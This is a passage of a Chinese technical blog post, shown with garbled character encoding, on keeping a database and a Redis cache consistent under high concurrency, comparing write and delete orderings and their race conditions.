content="è‹ä¸‰è¯´æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é«˜å¹¶å‘ä¸‹æ˜¯å…ˆå†™æ•°æ®åº“ï¼Œè¿˜æ˜¯å…ˆå†™ç¼“å­˜ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ä¸‰è¯´æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:57:07.000Z" title="Tue Jan 20 2026 01:57:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯è‹ä¸‰ï¼Œåˆè·Ÿå¤§å®¶è§é¢äº†</p>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>æ•°æ®åº“å’Œç¼“å­˜ï¼ˆæ¯”å¦‚ï¼šredisï¼‰åŒå†™æ•°æ®ä¸€è‡´æ€§é—®é¢˜ï¼Œæ˜¯ä¸€ä¸ªè·Ÿå¼€å‘è¯­è¨€æ— å…³çš„å…¬å…±é—®é¢˜ã€‚å°¤å…¶åœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸‹ï¼Œè¿™ä¸ªé—®é¢˜å˜å¾—æ›´åŠ ä¸¥é‡ã€‚</p>
<p>æˆ‘å¾ˆè´Ÿè´£çš„å‘Šè¯‰ä½ ï¼Œè¯¥é—®é¢˜æ— è®ºåœ¨é¢è¯•ï¼Œè¿˜æ˜¯å·¥ä½œä¸­é‡åˆ°çš„æ¦‚ç‡éå¸¸å¤§ï¼Œæ‰€ä»¥éå¸¸æœ‰å¿…è¦è·Ÿå¤§å®¶ä¸€èµ·æ¢è®¨ä¸€ä¸‹ã€‚</p>
<p>ä»Šå¤©è¿™ç¯‡æ–‡ç« æˆ‘ä¼šä»æµ…å…¥æ·±ï¼Œè·Ÿå¤§å®¶ä¸€èµ·èŠèŠï¼Œæ•°æ®åº“å’Œç¼“å­˜åŒå†™æ•°æ®ä¸€è‡´æ€§é—®é¢˜å¸¸è§çš„è§£å†³æ–¹æ¡ˆï¼Œè¿™äº›æ–¹æ¡ˆä¸­å¯èƒ½å­˜åœ¨çš„å‘ï¼Œä»¥åŠæœ€ä¼˜æ–¹æ¡ˆæ˜¯ä»€ä¹ˆã€‚</p>
<h2 data-id="heading-1">1. å¸¸è§æ–¹æ¡ˆ</h2>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨ç¼“å­˜çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æå‡æŸ¥è¯¢çš„æ€§èƒ½ã€‚ å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯è¿™æ ·ä½¿ç”¨ç¼“å­˜çš„ï¼š<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b21b34cd40dd40c38b6836e0e57f5511~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=oW%2BL2k3oLHGnEziVUWxOu3WHh7A%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>ç”¨æˆ·è¯·æ±‚è¿‡æ¥ä¹‹åï¼Œå…ˆæŸ¥ç¼“å­˜æœ‰æ²¡æœ‰æ•°æ®ï¼Œå¦‚æœæœ‰åˆ™ç›´æ¥è¿”å›ã€‚</li>
<li>å¦‚æœç¼“å­˜æ²¡æ•°æ®ï¼Œå†ç»§ç»­æŸ¥æ•°æ®åº“ã€‚</li>
<li>å¦‚æœæ•°æ®åº“æœ‰æ•°æ®ï¼Œåˆ™å°†æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®ï¼Œæ”¾å…¥ç¼“å­˜ä¸­ï¼Œç„¶åè¿”å›è¯¥æ•°æ®ã€‚</li>
<li>å¦‚æœæ•°æ®åº“ä¹Ÿæ²¡æ•°æ®ï¼Œåˆ™ç›´æ¥è¿”å›ç©ºã€‚</li>
</ol>
<p>è¿™æ˜¯ç¼“å­˜éå¸¸å¸¸è§çš„ç”¨æ³•ã€‚ä¸€çœ¼çœ‹ä¸Šå»ï¼Œå¥½åƒæ²¡æœ‰å•¥é—®é¢˜ã€‚</p>
<p>ä½†ä½ å¿½ç•¥äº†ä¸€ä¸ªéå¸¸é‡è¦çš„ç»†èŠ‚ï¼š<strong>å¦‚æœæ•°æ®åº“ä¸­çš„æŸæ¡æ•°æ®ï¼Œæ”¾å…¥ç¼“å­˜ä¹‹åï¼Œåˆç«‹é©¬è¢«æ›´æ–°äº†ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•æ›´æ–°ç¼“å­˜å‘¢ï¼Ÿ</strong></p>
<p>ä¸æ›´æ–°ç¼“å­˜è¡Œä¸è¡Œï¼Ÿ</p>
<p>ç­”ï¼šå½“ç„¶ä¸è¡Œï¼Œå¦‚æœä¸æ›´æ–°ç¼“å­˜ï¼Œåœ¨å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´å†…ï¼ˆå†³å®šäºç¼“å­˜çš„è¿‡æœŸæ—¶é—´ï¼‰ï¼Œç”¨æˆ·è¯·æ±‚ä»ç¼“å­˜ä¸­è·å–åˆ°çš„éƒ½å¯èƒ½æ˜¯æ—§å€¼ï¼Œè€Œéæ•°æ®åº“çš„æœ€æ–°å€¼ã€‚è¿™ä¸æ˜¯æœ‰æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ï¼Ÿ</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•æ›´æ–°ç¼“å­˜å‘¢ï¼Ÿ</p>
<p>ç›®å‰æœ‰ä»¥ä¸‹4ç§æ–¹æ¡ˆï¼š</p>
<ol>
<li>å…ˆå†™ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“</li>
<li>å…ˆå†™æ•°æ®åº“ï¼Œå†å†™ç¼“å­˜</li>
<li>å…ˆåˆ ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“</li>
<li>å…ˆå†™æ•°æ®åº“ï¼Œå†åˆ ç¼“å­˜</li>
</ol>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¯¦ç»†è¯´è¯´è¿™4ç§æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-2">2. å…ˆå†™ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“</h2>
<p>å¯¹äºæ›´æ–°ç¼“å­˜çš„æ–¹æ¡ˆï¼Œå¾ˆå¤šäººç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å¯èƒ½æ˜¯åœ¨å†™æ“ä½œä¸­ç›´æ¥æ›´æ–°ç¼“å­˜ï¼ˆå†™ç¼“å­˜ï¼‰ï¼Œæ›´ç›´æ¥æ˜äº†ã€‚</p>
<p>é‚£ä¹ˆï¼Œé—®é¢˜æ¥äº†ï¼šåœ¨å†™æ“ä½œä¸­ï¼Œåˆ°åº•æ˜¯å…ˆå†™ç¼“å­˜ï¼Œè¿˜æ˜¯å…ˆå†™æ•°æ®åº“å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬åœ¨è¿™é‡Œå…ˆèŠèŠå…ˆå†™ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“çš„æƒ…å†µï¼Œå› ä¸ºå®ƒçš„é—®é¢˜æœ€ä¸¥é‡ã€‚<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0ab2f9ad42f4af8bac0903d24439ea3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=UUJQfRjlKciAMYyXKc%2FqhOGPYL0%3D" alt="å›¾ç‰‡" loading="lazy"/>æŸä¸€ä¸ªç”¨æˆ·çš„æ¯ä¸€æ¬¡å†™æ“ä½œï¼Œå¦‚æœåˆšå†™å®Œç¼“å­˜ï¼Œçªç„¶ç½‘ç»œå‡ºç°äº†å¼‚å¸¸ï¼Œå¯¼è‡´å†™æ•°æ®åº“å¤±è´¥äº†ã€‚<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f60b1f0ce462490b85207b2797fec9c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=EjXu9eeDiM8P1DxJCV%2FMDhedjjc%3D" alt="å›¾ç‰‡" loading="lazy"/>å…¶ç»“æœæ˜¯ç¼“å­˜æ›´æ–°æˆäº†æœ€æ–°æ•°æ®ï¼Œä½†æ•°æ®åº“æ²¡æœ‰ï¼Œè¿™æ ·ç¼“å­˜ä¸­çš„æ•°æ®ä¸å°±å˜æˆè„æ•°æ®äº†ï¼Ÿå¦‚æœæ­¤æ—¶è¯¥ç”¨æˆ·çš„æŸ¥è¯¢è¯·æ±‚ï¼Œæ­£å¥½è¯»å–åˆ°è¯¥æ•°æ®ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ï¼Œå› ä¸ºè¯¥æ•°æ®åœ¨æ•°æ®åº“ä¸­æ ¹æœ¬ä¸å­˜åœ¨ï¼Œè¿™ä¸ªé—®é¢˜éå¸¸ä¸¥é‡ã€‚</p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œç¼“å­˜çš„ä¸»è¦ç›®çš„æ˜¯æŠŠæ•°æ®åº“çš„æ•°æ®ä¸´æ—¶ä¿å­˜åœ¨å†…å­˜ï¼Œä¾¿äºåç»­çš„æŸ¥è¯¢ï¼Œæå‡æŸ¥è¯¢é€Ÿåº¦ã€‚</p>
<p>ä½†å¦‚æœæŸæ¡æ•°æ®ï¼Œåœ¨æ•°æ®åº“ä¸­éƒ½ä¸å­˜åœ¨ï¼Œä½ ç¼“å­˜è¿™ç§â€œ<code>å‡æ•°æ®</code>â€åˆæœ‰å•¥æ„ä¹‰å‘¢ï¼Ÿ</p>
<p>å› æ­¤ï¼Œå…ˆå†™ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“çš„æ–¹æ¡ˆæ˜¯ä¸å¯å–çš„ï¼Œåœ¨å®é™…å·¥ä½œä¸­ç”¨å¾—ä¸å¤šã€‚</p>
<h2 data-id="heading-3">3. å…ˆå†™æ•°æ®åº“ï¼Œå†å†™ç¼“å­˜</h2>
<p>æ—¢ç„¶ä¸Šé¢çš„æ–¹æ¡ˆè¡Œä¸é€šï¼Œæ¥ä¸‹æ¥ï¼ŒèŠèŠå…ˆå†™æ•°æ®åº“ï¼Œå†å†™ç¼“å­˜çš„æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆåœ¨ä½å¹¶å‘ç¼–ç¨‹ä¸­æœ‰äººåœ¨ç”¨ï¼ˆæˆ‘çŒœçš„ï¼‰ã€‚<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d40cd80cad94ce2ac5cb8822eeb9a42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=GKu4eT1SWwoTtB%2FVmnQikJJu%2FkI%3D" alt="å›¾ç‰‡" loading="lazy"/>ç”¨æˆ·çš„å†™æ“ä½œï¼Œå…ˆå†™æ•°æ®åº“ï¼Œå†å†™ç¼“å­˜ï¼Œå¯ä»¥é¿å…ä¹‹å‰â€œå‡æ•°æ®â€çš„é—®é¢˜ã€‚ä½†å®ƒå´å¸¦æ¥äº†æ–°çš„é—®é¢˜ã€‚</p>
<p>ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ</p>
<h3 data-id="heading-4">3.1 å†™ç¼“å­˜å¤±è´¥äº†</h3>
<p>å¦‚æœæŠŠå†™æ•°æ®åº“å’Œå†™ç¼“å­˜æ“ä½œï¼Œæ”¾åœ¨åŒä¸€ä¸ªäº‹åŠ¡å½“ä¸­ï¼Œå½“å†™ç¼“å­˜å¤±è´¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå†™å…¥æ•°æ®åº“çš„æ•°æ®è¿›è¡Œå›æ»šã€‚<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ccf1c4d61d544cdb311997433958611~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=zFHmKRdspwzsDglx13TkmHUuyG0%3D" alt="å›¾ç‰‡" loading="lazy"/>å¦‚æœæ˜¯å¹¶å‘é‡æ¯”è¾ƒå°ï¼Œå¯¹æ¥å£æ€§èƒ½è¦æ±‚ä¸å¤ªé«˜çš„ç³»ç»Ÿï¼Œå¯ä»¥è¿™ä¹ˆç©ã€‚</p>
<p>ä½†å¦‚æœåœ¨é«˜å¹¶å‘çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œå†™æ•°æ®åº“å’Œå†™ç¼“å­˜ï¼Œéƒ½å±äºè¿œç¨‹æ“ä½œã€‚ä¸ºäº†é˜²æ­¢å‡ºç°å¤§äº‹åŠ¡ï¼Œé€ æˆçš„æ­»é”é—®é¢˜ï¼Œé€šå¸¸å»ºè®®å†™æ•°æ®åº“å’Œå†™ç¼“å­˜ä¸è¦æ”¾åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨è¯¥æ–¹æ¡ˆä¸­ï¼Œå¦‚æœå†™æ•°æ®åº“æˆåŠŸäº†ï¼Œä½†å†™ç¼“å­˜å¤±è´¥äº†ï¼Œæ•°æ®åº“ä¸­å·²å†™å…¥çš„æ•°æ®ä¸ä¼šå›æ»šã€‚</p>
<p>è¿™å°±ä¼šå‡ºç°ï¼šæ•°æ®åº“æ˜¯<code>æ–°æ•°æ®</code>ï¼Œè€Œç¼“å­˜æ˜¯<code>æ—§æ•°æ®</code>ï¼Œä¸¤è¾¹<code>æ•°æ®ä¸ä¸€è‡´</code>çš„æƒ…å†µã€‚</p>
<h3 data-id="heading-5">3.1 é«˜å¹¶å‘ä¸‹çš„é—®é¢˜</h3>
<p>å‡è®¾åœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸­ï¼Œé’ˆå¯¹åŒä¸€ä¸ªç”¨æˆ·çš„åŒä¸€æ¡æ•°æ®ï¼Œæœ‰ä¸¤ä¸ªå†™æ•°æ®è¯·æ±‚ï¼šaå’Œbï¼Œå®ƒä»¬åŒæ—¶è¯·æ±‚åˆ°ä¸šåŠ¡ç³»ç»Ÿã€‚</p>
<p>å…¶ä¸­è¯·æ±‚aè·å–çš„æ˜¯æ—§æ•°æ®ï¼Œè€Œè¯·æ±‚bè·å–çš„æ˜¯æ–°æ•°æ®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7517022ca904cb797cd412db97c46f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=fcS3QHIsdYXfkpkr3FF0XuwHUr8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>è¯·æ±‚aå…ˆè¿‡æ¥ï¼Œåˆšå†™å®Œäº†æ•°æ®åº“ã€‚ä½†ç”±äºç½‘ç»œåŸå› ï¼Œå¡é¡¿äº†ä¸€ä¸‹ï¼Œè¿˜æ²¡æ¥å¾—åŠå†™ç¼“å­˜ã€‚</li>
<li>è¿™æ—¶å€™è¯·æ±‚bè¿‡æ¥äº†ï¼Œå…ˆå†™äº†æ•°æ®åº“ã€‚</li>
<li>æ¥ä¸‹æ¥ï¼Œè¯·æ±‚bé¡ºåˆ©å†™äº†ç¼“å­˜ã€‚</li>
<li>æ­¤æ—¶ï¼Œè¯·æ±‚aå¡é¡¿ç»“æŸï¼Œä¹Ÿå†™äº†ç¼“å­˜ã€‚</li>
</ol>
<p>å¾ˆæ˜¾ç„¶ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­ï¼Œè¯·æ±‚båœ¨ç¼“å­˜ä¸­çš„<code>æ–°æ•°æ®</code>ï¼Œè¢«è¯·æ±‚açš„<code>æ—§æ•°æ®</code>è¦†ç›–äº†ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼šåœ¨é«˜å¹¶å‘åœºæ™¯ä¸­ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡Œå…ˆå†™æ•°æ®åº“ï¼Œå†å†™ç¼“å­˜çš„æ“ä½œï¼Œå¯èƒ½ä¼šå‡ºç°æ•°æ®åº“æ˜¯æ–°å€¼ï¼Œè€Œç¼“å­˜ä¸­æ˜¯æ—§å€¼ï¼Œä¸¤è¾¹æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µã€‚</p>
<h3 data-id="heading-6">3.2 æµªè´¹ç³»ç»Ÿèµ„æº</h3>
<p>è¯¥æ–¹æ¡ˆè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„é—®é¢˜å°±æ˜¯ï¼šæ¯ä¸ªå†™æ“ä½œï¼Œå†™å®Œæ•°æ®åº“ï¼Œä¼šé©¬ä¸Šå†™ç¼“å­˜ï¼Œæ¯”è¾ƒ<code>æµªè´¹ç³»ç»Ÿèµ„æº</code>ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿ</p>
<p>ä½ å¯ä»¥è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœå†™çš„ç¼“å­˜ï¼Œå¹¶ä¸æ˜¯ç®€å•çš„æ•°æ®å†…å®¹ï¼Œè€Œæ˜¯è¦ç»è¿‡éå¸¸å¤æ‚çš„è®¡ç®—å¾—å‡ºçš„æœ€ç»ˆç»“æœã€‚è¿™æ ·æ¯å†™ä¸€æ¬¡ç¼“å­˜ï¼Œéƒ½éœ€è¦ç»è¿‡ä¸€æ¬¡éå¸¸å¤æ‚çš„è®¡ç®—ï¼Œä¸æ˜¯éå¸¸æµªè´¹ç³»ç»Ÿèµ„æºå—ï¼Ÿ</p>
<p>å°¤å…¶æ˜¯<code>cpu</code>å’Œ<code>å†…å­˜</code>èµ„æºã€‚</p>
<p>è¿˜æœ‰äº›ä¸šåŠ¡åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼š<code>å†™å¤šè¯»å°‘</code>ã€‚</p>
<p>å¦‚æœåœ¨è¿™ç±»ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œæ¯ä¸ªç”¨çš„å†™æ“ä½œï¼Œéƒ½éœ€è¦å†™ä¸€æ¬¡ç¼“å­˜ï¼Œæœ‰ç‚¹å¾—ä¸å¿å¤±ã€‚</p>
<p>ç”±æ­¤å¯è§ï¼Œåœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸­ï¼Œå…ˆå†™æ•°æ®åº“ï¼Œå†å†™ç¼“å­˜ï¼Œè¿™å¥—æ–¹æ¡ˆé—®é¢˜æŒºå¤šçš„ï¼Œä¹Ÿä¸å¤ªå»ºè®®ä½¿ç”¨ã€‚</p>
<p>å¦‚æœä½ å·²ç»ç”¨äº†ï¼Œèµ¶ç´§çœ‹çœ‹è¸©å‘äº†æ²¡ï¼Ÿ</p>
<h2 data-id="heading-7">4. å…ˆåˆ ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“</h2>
<p>é€šè¿‡ä¸Šé¢çš„å†…å®¹æˆ‘ä»¬å¾—çŸ¥ï¼Œå¦‚æœç›´æ¥æ›´æ–°ç¼“å­˜çš„é—®é¢˜å¾ˆå¤šã€‚</p>
<p>é‚£ä¹ˆï¼Œä¸ºä½•æˆ‘ä»¬ä¸èƒ½æ¢ä¸€ç§æ€è·¯ï¼šä¸å»ç›´æ¥<code>æ›´æ–°ç¼“å­˜</code>ï¼Œè€Œæ”¹ä¸º<code>åˆ é™¤ç¼“å­˜</code>å‘¢ï¼Ÿ</p>
<p>åˆ é™¤ç¼“å­˜æ–¹æ¡ˆï¼ŒåŒæ ·æœ‰ä¸¤ç§ï¼š</p>
<ol>
<li>å…ˆåˆ ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“</li>
<li>å…ˆå†™æ•°æ®åº“ï¼Œå†åˆ ç¼“å­˜</li>
</ol>
<p>æˆ‘ä»¬ä¸€èµ·å…ˆçœ‹çœ‹ï¼šå…ˆåˆ ç¼“å­˜ï¼Œå†å†™æ•°æ®åº“çš„æƒ…å†µã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec397d7144254e8d9fa39438f79706c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=MS0qYIVHBiFjErDIXg0%2Fh%2Fv%2FhO0%3D" alt="å›¾ç‰‡" loading="lazy"/>è¯´ç™½äº†ï¼Œåœ¨ç”¨æˆ·çš„å†™æ“ä½œä¸­ï¼Œå…ˆæ‰§è¡Œåˆ é™¤ç¼“å­˜æ“ä½œï¼Œå†å»å†™æ•°æ®åº“ã€‚è¿™å¥—æ–¹æ¡ˆï¼Œå¯ä»¥æ˜¯å¯ä»¥ï¼Œä½†ä¹Ÿä¼šæœ‰ä¸€æ ·é—®é¢˜ã€‚</p>
<h3 data-id="heading-8">4.1 é«˜å¹¶å‘ä¸‹çš„é—®é¢˜</h3>
<p>å‡è®¾åœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸­ï¼ŒåŒä¸€ä¸ªç”¨æˆ·çš„åŒä¸€æ¡æ•°æ®ï¼Œæœ‰ä¸€ä¸ªè¯»æ•°æ®è¯·æ±‚cï¼Œè¿˜æœ‰å¦ä¸€ä¸ªå†™æ•°æ®è¯·æ±‚dï¼ˆä¸€ä¸ªæ›´æ–°æ“ä½œï¼‰ï¼ŒåŒæ—¶è¯·æ±‚åˆ°ä¸šåŠ¡ç³»ç»Ÿã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aafcb1ecde5e4175960f7647dfc86685~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769479027&amp;x-signature=%2BEorghdKkk4FqtdQ67ZsEPqdyKM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>è¯·æ±‚då…ˆè¿‡æ¥ï¼ŒæŠŠç¼“å­˜åˆ é™¤äº†ã€‚ä½†ç”±äºç½‘ç»œåŸå› ï¼Œå¡é¡¿äº†ä¸€ä¸‹ï¼Œè¿˜æ²¡æ¥å¾—åŠå†™æ•°æ®åº“ã€‚</li>
<li>è¿™æ—¶è¯·æ±‚cè¿‡æ¥äº†ï¼Œå…ˆæŸ¥ç¼“å­˜å‘ç°æ²¡æ•°æ®ï¼Œå†æŸ¥æ•°æ®åº“ï¼Œæœ‰æ•°æ®ï¼Œä½†æ˜¯æ—§å€¼ã€‚</li>
